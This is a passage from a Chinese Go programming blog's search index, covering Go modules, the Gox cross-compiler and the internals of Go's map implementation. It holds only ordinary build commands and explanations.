命令，将这个依赖项彻底从 Go Module 构建上下文中清除掉。go mod tidy 会自动分析源码依赖，而且将不再使用的依赖从 go.mod 和 go.sum 中移除。 go mod tidy ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:5","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"特殊情况：使用 vendor Go Module 构建模式下，我们再也无需手动维护 vendor 目录下的依赖包了，Go 提供了可以快速建立和更新 vendor 的命令，我们还是以前面的 module-mode 项目为例，通过下面命令为该项目建立 vendor： $go mod vendor $tree -LF 2 vendor vendor ├── github.com/ │ ├── google/ │ ├── magefile/ │ └── sirupsen/ ├── golang.org/ │ └── x/ └── modules.txt go mod vendor 命令在 vendor 目录下，创建了一份这个项目的依赖包的副本，并且通过 vendor/modules.txt 记录了 vendor 下的 module 以及版本。 如果我们要基于 vendor 构建，而不是基于本地缓存的 Go Module 构建，我们需要在 go build 后面加上 -mod=vendor 参数。 在 Go 1.14 及以后版本中，如果 Go 项目的顶层目录下存在 vendor 目录，那么 go build 默认也会优先基于 vendor 构建，除非你给 go build 传入 -mod=mod 的参数。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:5:6","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"小结 关于 go module Go 包是 Go 语言的基本组成单元。一个 Go 程序就是一组包的集合，所有 Go 代码都位于包中； Go 源码可以导入其他 Go 包，并使用其中的导出语法元素，包括类型、变量、函数、方法等，而且，main 函数是整个 Go 应用的入口函数； Go 源码需要先编译，再分发和运行。如果是单 Go 源文件的情况，我们可以直接使用 go build 命令 +Go 源文件名的方式编译。不过，对于复杂的 Go 项目，我们需要在 Go Module 的帮助下完成项目的构建。 关于项目结构 首先，对于以生产可执行程序为目的的 Go 项目，它的典型项目结构分为五部分： 放在项目顶层的 Go Module 相关文件，包括 go.mod 和 go.sum； cmd 目录：存放项目要编译构建的可执行文件所对应的 main 包的源码文件； 项目包目录：每个项目下的非 main 包都“平铺”在项目的根目录下，每个目录对应一个 Go 包； internal 目录：存放仅项目内部引用的 Go 包，这些包无法被项目之外引用； vendor 目录：这是一个可选目录，为了兼容 Go 1.5 引入的 vendor 构建模式而存在的。这个目录下的内容均由 Go 命令自动维护，不需要开发者手工干预 第二，对于以生产可复用库为目的的 Go 项目，它的典型结构则要简单许多，我们可以直接理解为在 Go 可执行程序项目的基础上去掉 cmd 目录和 vendor 目录。 最后，早期接纳 Go 语言的开发者所建立的项目的布局深受 Go 创世项目 1.4 版本之前布局的影响，将可导出的公共包放入单独的 pkg 目录下，我们了解这种情况即可。对于新建 Go 项目，我依旧建议你采用前面介绍的标准布局形式。 4. 依赖管理 通过 go get 我们可以升级或降级某依赖的版本，如果升级或降级前后的版本不兼容，这里千万注意别忘了变化包导入路径中的版本号，这是 Go 语义导入版本机制的要求； 通过 go mod tidy，我们可以自动分析 Go 源码的依赖变更，包括依赖的新增、版本变更以及删除，并更新 go.mod 中的依赖信息。 通过 go mod vendor，我们依旧可以支持 vendor 机制，并且可以对 vendor 目录下缓存的依赖包进行自动管理。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:6:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"go mod相关命令 进入到项目包含\"go.mod\"文件的目录路径，执行下面命令，进行项目依赖包本地化。 export GO111MODULE=\"on\" export GOPROXY=https://goproxy.cn go mod tidy go mod vendor ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:7:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"实例 ### src/github.com/kubeflow/training-operator (master) $ go mod tidy go: downloading k8s.io/code-generator v0.19.9 go: downloading github.com/kubeflow/common v0.4.1 go: downloading sigs.k8s.io/controller-runtime v0.7.2 go: downloading github.com/google/go-cmp v0.5.4 go: downloading golang.org/x/sys v0.0.0-20210510120138-977fb7262007 go: downloading k8s.io/apiextensions-apiserver v0.19.2 go: downloading github.com/Azure/go-autorest/autorest v0.9.6 go: downloading golang.org/x/lint v0.0.0-20191125180803-fdd1cda4f05f go: downloading honnef.co/go/tools v0.0.1-2019.2.3 go: downloading k8s.io/gengo v0.0.0-20200428234225-8167cfdcfc14 go: downloading cloud.google.com/go v0.51.0 go: downloading github.com/Azure/go-autorest/autorest/adal v0.8.2 go: downloading github.com/Azure/go-autorest/tracing v0.5.0 go: downloading github.com/Azure/go-autorest/autorest/mocks v0.3.0 go: downloading github.com/Azure/go-autorest/logger v0.1.0 go: downloading github.com/Azure/go-autorest/autorest/date v0.2.0 #### github.com/kubeflow/training-operator (master) $ go mod vendor go mod模式 # cd project_path export GO111MODULE=\"on\" export GOPROXY=https://goproxy.cn # go mod init module_path go mod init github.com/bingerambo/go-file-json-server go mod tidy go build go list -m -json all ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:7:1","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"附录 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:0","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"go env #set GO111MODULE=on #set GOPROXY=https://goproxy.io #export GO111MODULE=\"off\" export GO111MODULE=\"on\" export GOPROXY=https://goproxy.cn #go mod init module_path go mod init github.com/bingerambo/file_notify go mod tidy go build go list -m -json all ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:1","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"查看下版本依赖 go list -m -json all { \"Path\": \"github.com/bingerambo/file_notify\", \"Main\": true, \"Dir\": \"D:\\\\GO_projects\\\\src\\\\github.com\\\\bingerambo\\\\file_notify\", \"GoMod\": \"D:\\\\GO_projects\\\\src\\\\github.com\\\\bingerambo\\\\file_notify\\\\go.mod\", \"GoVersion\": \"1.12\" } { \"Path\": \"github.com/fsnotify/fsnotify\", \"Version\": \"v1.5.1\", \"Time\": \"2021-08-24T19:33:57Z\", \"Dir\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\github.com\\\\fsnotify\\\\fsnotify@v1.5.1\", \"GoMod\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\cache\\\\download\\\\github.com\\\\fsnotify\\\\fsnotify\\\\@v\\\\v1.5.1.mod\", \"GoVersion\": \"1.13\" } { \"Path\": \"github.com/howeyc/fsnotify\", \"Version\": \"v0.9.0\", \"Time\": \"2014-02-27T14:46:22Z\", \"Dir\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\github.com\\\\howeyc\\\\fsnotify@v0.9.0\", \"GoMod\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\cache\\\\download\\\\github.com\\\\howeyc\\\\fsnotify\\\\@v\\\\v0.9.0.mod\" } { \"Path\": \"golang.org/x/sys\", \"Version\": \"v0.0.0-20210630005230-0f9fa26af87c\", \"Time\": \"2021-06-30T00:52:30Z\", \"Indirect\": true, \"Dir\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\golang.org\\\\x\\\\sys@v0.0.0-20210630005230-0f9fa26af87c\", \"GoMod\": \"D:\\\\GO_projects\\\\pkg\\\\mod\\\\cache\\\\download\\\\golang.org\\\\x\\\\sys\\\\@v\\\\v0.0.0-20210630005230-0f9fa26af87c.mod\", \"GoVersion\": \"1.17\" } ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:2","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"demo程序 我们创建一个新项目“hellomodule”，在新项目中我们将使用两个第三方库，zap 和 fasthttp，给 go build 的构建过程增加一些难度。和“hello，world”示例一样，我们通过下面命令创建“hellomodule”项目： $cd ~/goprojects $mkdir hellomodule $cd hellomodule 接着，我们在“hellomodule“下创建并编辑我们的示例源码文件： package main import ( \"github.com/valyala/fasthttp\" \"go.uber.org/zap\" ) var logger *zap.Logger func init() { logger, _ = zap.NewProduction() } func fastHTTPHandler(ctx *fasthttp.RequestCtx) { logger.Info(\"hello, go module\", zap.ByteString(\"uri\", ctx.RequestURI())) } func main() { fasthttp.ListenAndServe(\":8081\", fastHTTPHandler) } 我们尝试一下使用编译“hello，world”的方法来编译“hellomodule”中的 main.go 源文件，go 编译器的输出结果是这样的： Go module 构建模式是在 Go 1.11 版本正式引入的，为的是彻底解决 Go 项目复杂版本依赖的问题，在 Go 1.16 版本中，Go module 已经成为了 Go 默认的包依赖管理机制和 Go 源码构建机制。 $go build main.go main.go:4:2: no required module provides package github.com/valyala/fasthttp: go.mod file not found in current directory or any parent directory; see 'go help modules' main.go:5:2: no required module provides package go.uber.org/zap: go.mod file not found in current directory or any parent directory; see 'go help modules' Go Module 的核心是一个名为 go.mod 的文件，在这个文件中存储了这个 module 对第三方依赖的全部信息。接下来，我们就通过下面命令为“hello，module”这个示例程序添加 go.mod 文件： 在hellomodule目录下执行命令： $go mod init github.com/bigwhite/hellomodule go: creating new go.mod: module github.com/bigwhite/hellomodule go: to add module requirements and sums: go mod tidy 你会看到，go mod init 命令的执行结果是在当前目录下生成了一个 go.mod 文件： $cat go.mod module github.com/bigwhite/hellomodule go 1.16 其实，一个 module 就是一个包的集合，这些包和 module 一起打版本、发布和分发。go.mod 所在的目录被我们称为它声明的 module 的根目录。 不过呢，这个时候的 go.mod 文件内容还比较简单，第一行内容是用于声明 module 路径（module path）的。而且，module 隐含了一个命名空间的概念，module 下每个包的导入路径都是由 module path 和包所在子目录的名字结合在一起构成。 比如，如果 hellomodule 下有子目录 pkg/pkg1，那么 pkg1 下面的包的导入路径就是由 module path（github.com/bigwhite/hellomodule）和包所在子目录的名字（pkg/pkg1）结合而成，也就是 github.com/bigwhite/hellomodule/pkg/pkg1。 备注说明：也就是自己项目引用自己的pkg时可以使用 import github.com/bigwhite/hellomodule/pkg/pkg1 即模块名+路径方式获取，无需使用gopath 另外，go.mod 的最后一行是一个 Go 版本指示符，用于表示这个 module 是在某个特定的 Go 版本的 module 语义的基础上编写的。 有了 go.mod 后，是不是我们就可以构建 hellomodule 示例了呢？ 来试试看！我们执行一下构建，Go 编译器输出结果是这样的： $go build main.go main.go:4:2: no required module provides package github.com/valyala/fasthttp; to add it: go get github.com/valyala/fasthttp main.go:5:2: no required module provides package go.uber.org/zap; to add it: go get go.uber.org/zap 你会看到，Go 编译器提示源码依赖 fasthttp 和 zap 两个第三方包，但是 go.mod 中没有这两个包的版本信息，我们需要按提示手工添加信息到 go.mod 中。 这个时候，除了按提示手动添加外，我们也可以使用 go mod tidy 命令，让 Go 工具自动添加： $go mod tidy go: downloading go.uber.org/zap v1.18.1 go: downloading github.com/valyala/fasthttp v1.28.0 go: downloading github.com/andybalholm/brotli v1.0.2 ... ... 从输出结果中，我们看到 Go 工具不仅下载并添加了 hellomodule 直接依赖的 zap 和 fasthttp 包的信息，还下载了这两个包的相关依赖包。go mod tidy 执行后，我们 go.mod 的最新内容变成了这个样子： module github.com/bigwhite/hellomodule go 1.16 require ( github.com/valyala/fasthttp v1.28.0 go.uber.org/zap v1.18.1 ) 这个时候，go.mod 已经记录了 hellomodule 直接依赖的包的信息。不仅如此，hellomodule 目录下还多了一个名为 go.sum 的文件，这个文件记录了 hellomodule 的直接依赖和间接依赖包的相关版本的 hash 值，用来校验本地包的真实性。在构建的时候，如果本地依赖包的 hash 值与 go.sum 文件中记录的不一致，就会被拒绝构建。 有了 go.mod 以及 hellomodule 依赖的包版本信息后，我们再来执行构建： $go build main.go $ls go.mod go.sum main* main.go 这次我们成功构建出了可执行文件 main，运行这个文件，新开一个终端窗口，在新窗口中使用 curl 命令访问该 http 服务：curl localhost:8081/foo/bar，我们就会看到服务端输出如下日志： $./main {\"level\":\"info\",\"ts\":1626614126.9899719,\"caller\":\"hellomodule/main.go:15\",\"msg\":\"hello, go module\",\"uri\":\"/foo/bar\"} 这下，我们的“ hellomodule”程序可算创建成功了。我们也看到使用 Go Module 的构建模式，go build 完全可以承担其构建规模较大、依赖复杂的 Go 项目的重任。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:3","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"问题一：依赖的包下载到哪里了？还在GOPATH/src里吗？ 不在。 使用Go的包管理方式，依赖的第三方包被下载到了$GOPATH/pkg/mod路径下。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:4","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"问题二： 依赖包的版本是怎么控制的？ 在上一个问题里，可以看到最终下载在$GOPATH/pkg/mod 下的包中最后会有一个版本号 v1.0.5，也就是说，$GOPATH/pkg/mod里可以保存相同包的不同版本。 版本是在go.mod中指定的。如果，在go.mod中没有指定，go命令会自动下载代码中的依赖的最新版本，本例就是自动下载最新的版本。如果，在go.mod用require语句指定包和版本 ，go命令会根据指定的路径和版本下载包， 指定版本时可以用latest，这样它会自动下载指定包的最新版本； ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:5","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"问题三： 可以把项目放在$GOPATH/src下吗？ 可以。但是go会根据GO111MODULE的值而采取不同的处理方式，默认情况下，GO111MODULE=auto 自动模式 1.auto 自动模式下，项目在$GOPATH/src里会使用$GOPATH/src的依赖包，在$GOPATH/src外，就使用go.mod 里 require的包 2.on 开启模式，1.12后，无论在$GOPATH/src里还是在外面，都会使用go.mod 里 require的包 3.off 关闭模式，就是老规矩。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:6","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"问题四： 依赖包中的地址失效了怎么办？比如 golang.org/x/… 下的包都无法下载怎么办？ 在go快速发展的过程中，有一些依赖包地址变更了。以前的做法： 1.修改源码，用新路径替换import的地址 2.git clone 或 go get 新包后，copy到$GOPATH/src里旧的路径下 无论什么方法，都不便于维护，特别是多人协同开发时。 使用go.mod就简单了，在go.mod文件里用 replace 替换包，例如 replace golang.org/x/text =\u003e github.com/golang/text latest 这样，go会用 github.com/golang/text 替代golang.org/x/text，原理就是下载github.com/golang/text 的最新版本到 $GOPATH/pkg/mod/golang.org/x/text下。 ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:7","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"问题五： init生成的go.mod的模块名称有什么用？ 本例里，用 go mod init hello 生成的go.mod文件里的第一行会申明module hello 因为我们的项目已经不在$GOPATH/src里了，那么引用自己怎么办？就用模块名+路径。 例如，在项目下新建目录 utils，创建一个tools.go文件: 在根目录下的hello.go文件就可以 import “hello/utils” 引用utils import hello/utils ","date":"2022-04-03","objectID":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/:8:8","tags":["Go"],"title":"Go module介绍","uri":"/posts/2022/04/go-module%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"本文介绍Golang交叉编译工具Gox的安装 ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:0:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"Gox gox是Golang常用的交叉编译工具，比如在制作指定操作系统版本的程序docker镜像。 ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:1:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"Gox安装 export GOPROXY=https://goproxy.cn go get github.com/mitchellh/gox 然后在默认安装的位置$GOPATH/bin下找到gox，如: /home/dragon/GO_projects/bin/gox 如要直接运行命令使用，则将gox拷贝到$GOROOT/bin下 ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:2:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"Gox说明 可以使用 -h 调出帮助 gox -h 如下： $ gox -h Usage: gox [options] [packages] Gox cross-compiles Go applications in parallel. If no specific operating systems or architectures are specified, Gox will build for all pairs supported by your version of Go. Options: -arch=\"\" Space-separated list of architectures to build for -build-toolchain Build cross-compilation toolchain -cgo Sets CGO_ENABLED=1, requires proper C toolchain (advanced) -gcflags=\"\" Additional '-gcflags' value to pass to go build -ldflags=\"\" Additional '-ldflags' value to pass to go build -asmflags=\"\" Additional '-asmflags' value to pass to go build -tags=\"\" Additional '-tags' value to pass to go build -mod=\"\" Additional '-mod' value to pass to go build -os=\"\" Space-separated list of operating systems to build for -osarch=\"\" Space-separated list of os/arch pairs to build for -osarch-list List supported os/arch pairs for your Go version -output=\"foo\" Output path template. See below for more info -parallel=-1 Amount of parallelism, defaults to number of CPUs -race Build with the go race detector enabled, requires CGO -gocmd=\"go\" Build command, defaults to Go -rebuild Force rebuilding of package that were up to date -verbose Verbose mode Output path template: The output path for the compiled binaries is specified with the \"-output\" flag. The value is a string that is a Go text template. The default value is \"{{.Dir}}_{{.OS}}_{{.Arch}}\". The variables and their values should be self-explanatory. Platforms (OS/Arch): The operating systems and architectures to cross-compile for may be specified with the \"-arch\" and \"-os\" flags. These are space separated lists of valid GOOS/GOARCH values to build for, respectively. You may prefix an OS or Arch with \"!\" to negate and not build for that platform. If the list is made up of only negations, then the negations will come from the default list. Additionally, the \"-osarch\" flag may be used to specify complete os/arch pairs that should be built or ignored. The syntax for this is what you would expect: \"darwin/amd64\" would be a valid osarch value. Multiple can be space separated. An os/arch pair can begin with \"!\" to not build for that platform. The \"-osarch\" flag has the highest precedent when determing whether to build for a platform. If it is included in the \"-osarch\" list, it will be built even if the specific os and arch is negated in \"-os\" and \"-arch\", respectively. Platform Overrides: The \"-gcflags\", \"-ldflags\" and \"-asmflags\" options can be overridden per-platform by using environment variables. Gox will look for environment variables in the following format and use those to override values if they exist: GOX_[OS]_[ARCH]_GCFLAGS GOX_[OS]_[ARCH]_LDFLAGS GOX_[OS]_[ARCH]_ASMFLAGS 第一次使用要进行构建交叉编译的库,这一步很慢,我的机器大概需要5分钟左右. gox -build-toolchain 构建好就可以使用了,如果你想构建全平台（主流）的文件,那么直接 gox ,目录下会生成对应平台的文件. $ gox Number of parallel builds: 4 --\u003e darwin/386: github.com/mitchellh/gox --\u003e darwin/amd64: github.com/mitchellh/gox --\u003e linux/386: github.com/mitchellh/gox --\u003e linux/amd64: github.com/mitchellh/gox --\u003e linux/arm: github.com/mitchellh/gox --\u003e freebsd/386: github.com/mitchellh/gox --\u003e freebsd/amd64: github.com/mitchellh/gox --\u003e openbsd/386: github.com/mitchellh/gox --\u003e openbsd/amd64: github.com/mitchellh/gox --\u003e windows/386: github.com/mitchellh/gox --\u003e windows/amd64: github.com/mitchellh/gox --\u003e freebsd/arm: github.com/mitchellh/gox --\u003e netbsd/386: github.com/mitchellh/gox --\u003e netbsd/amd64: github.com/mitchellh/gox --\u003e netbsd/arm: github.com/mitchellh/gox --\u003e plan9/386: github.com/mitchellh/gox 当然，如果要指定平台可以使用如下命令： $ gox -os=\"linux\" or $ gox -osarch=\"linux/amd64\" or $ gox -osarch=\"linux/amd64 windows/amd64\" 如果要指定输出目录和文件名可以使用: $ gox -osarch=\"darwin/amd64\" -output=\"output_path\" 备注: gox交叉编译不支持 CGO，具体命令如下 CGO_ENABLED=0 gox -osarch=${OSARCH} -ldflags ${LD_FLAGS} -output=${OUTPUT_PATH} ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:3:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"实例 github上kube-batch项目的镜像编译 # Make the image of kube-batch 1.add gox to $GOROOT/bin 2.copy all items from vendor/* to $GOPATH 3.import the image alpine3.9 4.take a Terminal comand in $GOPATH/github.com/kubernetes-sigs/kube-batch : make images # gox in Makefile rel_bins: CGO_ENABLED=0 gox -osarch=${REL_OSARCH} -ldflags ${LD_FLAGS} \\ -output=${BIN_DIR}/{{.OS}}/{{.Arch}}/kube-batch ./cmd/kube-batch ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:4:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"附录 ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:5:0","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"Usage If you know how to use go build, then you know how to use Gox. For example, to build the current package, specify no parameters and just call gox. Gox will parallelize based on the number of CPUs you have by default and build for every platform by default: $ gox Number of parallel builds: 4 --\u003e darwin/386: github.com/mitchellh/gox --\u003e darwin/amd64: github.com/mitchellh/gox --\u003e linux/386: github.com/mitchellh/gox --\u003e linux/amd64: github.com/mitchellh/gox --\u003e linux/arm: github.com/mitchellh/gox --\u003e freebsd/386: github.com/mitchellh/gox --\u003e freebsd/amd64: github.com/mitchellh/gox --\u003e openbsd/386: github.com/mitchellh/gox --\u003e openbsd/amd64: github.com/mitchellh/gox --\u003e windows/386: github.com/mitchellh/gox --\u003e windows/amd64: github.com/mitchellh/gox --\u003e freebsd/arm: github.com/mitchellh/gox --\u003e netbsd/386: github.com/mitchellh/gox --\u003e netbsd/amd64: github.com/mitchellh/gox --\u003e netbsd/arm: github.com/mitchellh/gox --\u003e plan9/386: github.com/mitchellh/gox Or, if you want to build a package and sub-packages: $ gox ./... ... Or, if you want to build multiple distinct packages: $ gox github.com/mitchellh/gox github.com/hashicorp/serf ... Or if you want to just build for linux: $ gox -os=\"linux\" ... Or maybe you just want to build for 64-bit linux: $ gox -osarch=\"linux/amd64\" ... And more! Just run gox -h for help and additional information. ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:5:1","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"Versus Other Cross-Compile Tools A big thanks to these other options for existing. They each paved the way in many aspects to make Go cross-compilation approachable. Dave Cheney’s golang-crosscompile - Gox compiles for multiple platforms and can therefore easily run on any platform Go supports, whereas Dave’s scripts require a shell. Gox will also parallelize builds. Dave’s scripts build sequentially. Gox has much easier to use OS/Arch filtering built in. goxc - A very richly featured tool that can even do things such as build system packages, upload binaries, generate download webpages, etc. Gox is a super slim alternative that only cross-compiles binaries. Gox builds packages in parallel, whereas goxc doesn’t. Gox doesn’t enforce a specific output structure for built binaries. ","date":"2022-03-03","objectID":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/:5:2","tags":["Go"],"title":"Golang交叉编译工具Gox的安装","uri":"/posts/2022/03/golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7gox%E7%9A%84%E5%AE%89%E8%A3%85/"},{"categories":["Go"],"content":"[转载] go-map源码简单分析 map遍历为什么时随机的？ 文章从这里搬运：https://www.helloworld.net/p/3714029944 ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:0","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"GO 中map的底层是如何实现的 首先Go 语言采用的是哈希查找表，并且使用链表解决哈希冲突。 GO的内存模型 先看这一张map原理图 map 再来看看源码中map的定义 //src/runtime/map.go line 115 // A header for a Go map. type hmap struct { // Note: the format of the hmap is also encoded in cmd/compile/internal/gc/reflect.go. // Make sure this stays in sync with the compiler's definition. // count int //len(map)时，返回的值 flags uint8 //表示是否有其他协程在操作map B uint8 //上图中[]bmap的''长度'' 2^B noverflow uint16 //// 溢出的bucket个数 hash0 uint32 // hash seed buckets unsafe.Pointer //buckets 数组指针 oldbuckets unsafe.Pointer // 扩容的时候用于赋值的buckets数组 nevacuate uintptr // 搬迁进度 extra *mapextra // 用于扩容的指针 type mapextra struct { overflow *[]*bmap oldoverflow *[]*bmap nextOverflow *bmap } // A bucket for a Go map. type bmap struct { tophash [bucketCnt]uint8 // len为8的数组 } //底层定义的常量 const ( // Maximum number of key/value pairs a bucket can hold. bucketCntBits = 3 bucketCnt = 1 \u003c\u003c bucketCntBits } 但这只是表面(src/runtime/hashmap.go)的结构，编译期间会给它加料，动态地创建一个新的结构： type bmap struct { topbits [8]uint8 keys [8]keytype values [8]valuetype pad uintptr overflow uintptr } bmap 就是我们常说的“桶”，桶里面会最多装 8 个 key，这些 key 之所以会落入同一个桶，是因为它们经过哈希计算后，哈希结果是“一类”的(低位的B位决定bucket)。在桶内，又会根据 key 计算出来的 hash 值的高 8 位来决定 key 到底落入桶内的哪个位置（一个桶内最多有8个位置）。如上图所示 bmap 是存放 k-v 的地方，我们把视角拉近，仔细看 bmap 的内部组成。 上图就是 bucket 的内存模型， HOBHash 指的就是 top hash。注意到 key 和 value 是各自放在一起的，并不是 key/value/key/value/… 这样的形式。源码里说明这样的好处是在某些情况下可以省略掉 padding 字段，节省内存空间。 每个 bucket 设计成最多只能放 8 个 key-value 对，如果有第 9 个 key-value 落入当前的 bucket，那就需要再构建一个 bucket ，通过 overflow 指针连接起来。 ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:1","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"创建map 从语法上来说，创建一个map很简单（记得key的类型必须为可比较类型） maps := make(map[string]int) maps2 := map[string]int{ \"1\":1, \"2\":2, \"3\":3, } var maps3 map[string]int 通过汇编语言可以看到，实际上底层调用的是 makemap 函数，主要做的工作就是初始化 hmap 结构体的各种字段，例如计算 B 的大小，设置哈希种子 hash0 等等。 func makemap(t *maptype, hint int64, h *hmap, bucket unsafe.Pointer) *hmap 注意，这个函数返回的结果：*hmap，它是一个指针 func makeslice(et *_type, len, cap int) slice hash函数 map 的一个关键点在于，哈希函数的选择。在程序启动时，会检测 cpu 是否支持 aes，如果支持，则使用 aes hash，否则使用 memhash。这是在函数 alginit() 中完成，位于路径：src/runtime/alg.go 下。 hash 函数，有加密型和非加密型。加密型的一般用于加密数据、数字摘要等，典型代表就是 md5、sha1、sha256、aes256 这种；非加密型的一般就是查找。在 map 的应用场景中，用的是查找。选择 hash 